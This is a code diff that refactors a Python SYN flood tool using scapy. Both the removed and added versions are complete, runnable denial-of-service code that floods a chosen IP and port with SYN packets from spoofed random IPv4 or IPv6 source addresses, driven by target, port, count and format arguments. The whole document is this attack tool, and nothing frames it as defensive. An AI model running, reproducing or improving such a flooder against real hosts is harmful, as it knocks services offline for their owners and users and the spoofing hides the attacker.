@@ -1,115 +1,59 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 # Emre Ovunc
 # info@emreovunc.com
 # Python3 SYN Flood Tool CMD v2.0.1
 
 from sys import stdout
-from scapy.all import *
+from scapy.all import IP, IPv6, TCP, RandIP6, send
 from random import randint
 from argparse import ArgumentParser
 
 
-def randomIP():
-	ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
-	return ip
+def random_ip() -> str:
+    return ".".join(map(str, (randint(0, 255) for _ in range(4))))
 
+def rand_int() -> int:
+    return randint(1000, 9000)
 
-def randInt():
-	x = randint(1000, 9000)
-	return x
+def syn_flood(dst_ip: str, dst_port: int, counter: int):
+    total = 0
+    print("IPv4 Packets are sending ...")
 
+    for _ in range(counter):
+        ip_packet = IP(src=random_ip(), dst=dst_ip)
+        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
+        send(ip_packet/tcp_packet, verbose=0)
+        total += 1
 
-def SYN_Flood(dstIP, dstPort, counter):
-	total = 0
-	print ("IPv4 Packets are sending ...")
+    stdout.write(f"\nTotal packets sent: {total}\n")
 
-	for x in range (0, counter):
-		s_port = randInt()
-		s_eq = randInt()
-		w_indow = randInt()
+def syn_flood_v6(dst_ip: str, dst_port: int, counter: int):
+    total = 0
+    print("IPv6 Packets are sending ...")
 
-		IP_Packet = IP ()
-		IP_Packet.src = randomIP()
-		IP_Packet.dst = dstIP
+    for _ in range(counter):
+        ip_packet = IPv6(src=RandIP6(), dst=dst_ip)
+        tcp_packet = TCP(sport=rand_int(), dport=dst_port, flags="S", seq=rand_int(), window=rand_int())
+        send(ip_packet/tcp_packet, verbose=0)
+        total += 1
 
-		TCP_Packet = TCP ()
-		TCP_Packet.sport = s_port
-		TCP_Packet.dport = int(dstPort)
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
-
-		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
-
-	stdout.write("\nTotal packets sent: %i\n" % total)
-
-def SYN_Flood_v6(dstIP, dstPort, counter):
-	total = 0
-	print ("IPv6 Packets are sending ...")
-
-	for x in range (0, counter):
-		s_port = randInt()
-		s_eq = randInt()
-		w_indow = randInt()
-
-		IP_Packet = IPv6 ()
-		IP_Packet.src = RandIP6()
-		IP_Packet.dst = dstIP
-
-		TCP_Packet = TCP ()
-		TCP_Packet.sport = s_port
-		TCP_Packet.dport = int(dstPort)
-		TCP_Packet.flags = "S"
-		TCP_Packet.seq = s_eq
-		TCP_Packet.window = w_indow
-
-		send(IP_Packet/TCP_Packet, verbose=0)
-		total+=1
-
-	stdout.write("\nTotal packets sent: %i\n" % total)
-
+    stdout.write(f"\nTotal packets sent: {total}\n")
 
 def main():
-	parser = ArgumentParser()
-	parser.add_argument('--target', '-t', help='target IP address')
-	parser.add_argument('--port', '-p', help='target port number')
-	parser.add_argument('--count', '-c', help='number of packets')
-	parser.add_argument('--format', '-f', help='format of target(Can ignore, default use ipv4)')
-	parser.add_argument('--version', '-v', action='version', version='Python SynFlood Tool v2.0.1\n@EmreOvunc')
-	parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"
+    parser = ArgumentParser(description="Python3 SYN Flood Tool CMD v2.0.1")
+    parser.add_argument('--target', '-t', help='Target IP address', required=True)
+    parser.add_argument('--port', '-p', type=int, help='Target port number', required=True)
+    parser.add_argument('--count', '-c', type=int, help='Number of packets', default=1)
+    parser.add_argument('--format', '-f', type=int, choices=[4, 6], help='Format of target IP (4 for IPv4, 6 for IPv6)', default=4)
+    parser.add_argument('--version', '-v', action='version', version='Python SYN Flood Tool v2.0.1\n@EmreOvunc')
+    parser.epilog = "Usage: python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 1 -f 6"
 
-	args = parser.parse_args()
+    args = parser.parse_args()
 
-	if args.target is not None:
-		if args.port is not None:
-			if args.count is None:
-				print('[!]You did not use --counter/-c parameter, so 1 packet will be sent..')
-				SYN_Flood(args.target, args.port, 1)
+    if args.format == 6:
+        syn_flood_v6(args.target, args.port, args.count)
+    else:
+        syn_flood(args.target, args.port, args.count)
 
-			else:
-				print(f"args.format = {args.format}")
-				if args.format == '6':
-					SYN_Flood_v6(args.target, args.port, int(args.count))
-				else:
-					SYN_Flood(args.target, args.port, int(args.count))
-
-		else:
-			print('[-]Please, use --port/-p to give target\'s port!')
-			print('[!]Example: -p 445')
-			print('[?] -h for help')
-			exit()
-	else:
-		print('''usage: py3_synflood_cmd.py [-h] [--target TARGET] [--port PORT]
-                           [--count COUNT] [--version]
-optional arguments:
-  -h, --help            show this help message and exit
-  --target TARGET, -t TARGET
-                        target IP address
-  --port PORT, -p PORT  target port number
-  --count COUNT, -c COUNT
-                        number of packets
-  --version, -v         show program's version number and exit''')
-		exit()
-
-main()
+if __name__ == "__main__":
+    main()
